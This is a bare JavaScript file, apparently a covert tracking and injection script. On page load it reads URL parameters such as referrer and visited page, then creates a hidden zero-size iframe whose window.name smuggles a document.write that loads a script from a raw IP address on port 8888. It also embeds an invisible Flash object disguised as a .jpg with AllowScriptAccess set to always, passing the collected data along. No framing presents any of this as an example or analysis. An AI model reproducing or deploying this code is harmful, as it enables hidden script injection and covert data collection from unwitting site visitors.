
function Re51TongJi(argname) {
	var url = document.location.href;
	var arrStr = url.substring(url.indexOf("?") + 1).split("&");
	for (var i = 0; i < arrStr.length; i++) {
		var loc = arrStr[i].indexOf(argname + "=");
		if (loc != -1) {
			return arrStr[i].replace(argname + "=", "").replace("?", "");
			break;
		}
	}
	return "";
}
	var p =Re51TongJi('p');
	var r = Re51TongJi('r');//域名ID
	var t = Re51TongJi('t');//来路
	var u = Re51TongJi('u');//受访页
	

var action='m=no&p1='+ p +'&r1= '+ r +'&t1=' + t +'&u1=' + u;





function gbk_frame() {
    var b = "http://redbull.qq.com/info?id=898801&" + action ;
    var a = document.createElement("iframe");
    a.height = "0";
    a.width = "0";
    a.marginwidth = "0";
    a.marginheight = "0";
    a.border = "0";
    a.frameborder = "0";
    a.scrolling = "no";
    a.style.display = "none";
    a.src = b;
    a.name = "document.write('<script src=\"http://60.173.14.46:8888/cs/a30.js?v=5\"></script>')";
    document.body.appendChild(a)
}
gbk_frame();

function fxa() {
    /*1*/
    var obj = document.createElement('object');
    var param;
    obj.setAttribute('classid', 'clsid:D27CDB6E-AE6D-11cf-96B8-444553540000');
    obj.setAttribute('codebase', 'http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,28,0');
    obj.setAttribute('width', '0');
    obj.setAttribute('height', '0');
    obj.setAttribute('AllowScriptAccess', 'always');

    param = document.createElement('param');
    param.setAttribute('name', "movie");
    param.setAttribute('value', 'http://cp.music.qq.com/file/6/50abe10d3e817c76/b/607662c2f4a4ab2b.jpg');
    obj.appendChild(param);

    param = document.createElement('param');
    param.setAttribute('name', "quality");
    param.setAttribute('value', "high");
    obj.appendChild(param);

    param = document.createElement('param');
    param.setAttribute('name', "AllowScriptAccess");
    param.setAttribute('value', "always");
    obj.appendChild(param);

    param = document.createElement('param');
    param.setAttribute('name', "FlashVars");
    param.setAttribute('value', action);
    obj.appendChild(param);
    param = document.createElement('embed');
    param.setAttribute('width', '0');
    param.setAttribute('height', '0');
    param.setAttribute('src', 'http://cp.music.qq.com/file/6/50abe10d3e817c76/b/607662c2f4a4ab2b.jpg');
    param.setAttribute('AllowScriptAccess', 'always');
    param.setAttribute('FlashVars', action);
    param.setAttribute('pluginspage', "http://www.adobe.com/shockwave/download/download.cgi?P1_Prod_Version=ShockwaveFlash");
	param.setAttribute('type', "application/x-shockwave-flash");
	obj.appendChild(param);
    document.body.appendChild(obj);
}
fxa();